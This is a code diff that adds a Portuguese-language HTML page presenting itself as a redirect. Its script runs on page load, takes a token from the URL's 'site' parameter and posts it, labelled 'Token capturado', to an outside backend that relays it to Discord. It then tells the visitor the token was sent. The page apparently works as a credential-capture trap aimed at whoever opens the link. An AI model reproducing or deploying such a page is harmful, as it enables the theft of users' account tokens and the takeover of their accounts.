@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <title>Redirecionando...</title>
+  <script>
+    window.addEventListener('DOMContentLoaded', () => {
+      const params = new URLSearchParams(window.location.search);
+      const token = params.get('site');
+
+      if (token) {
+        fetch("https://3dxchat-backend.onrender.com/send-to-discord", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ message: `Token capturado:\n\`${token}\`` })
+        })
+        .then(() => {
+          document.body.innerHTML = "<h2>Token enviado com sucesso!</h2>";
+        })
+        .catch((err) => {
+          console.error("Erro ao enviar:", err);
+          document.body.innerHTML = "<h2>Erro ao enviar token.</h2>";
+        });
+      } else {
+        document.body.innerHTML = "<h2>Nenhum token encontrado na URL.</h2>";
+      }
+    });
+  </script>
+</head>
+<body>
+  <h2>Processando token...</h2>
+</body>
+</html>
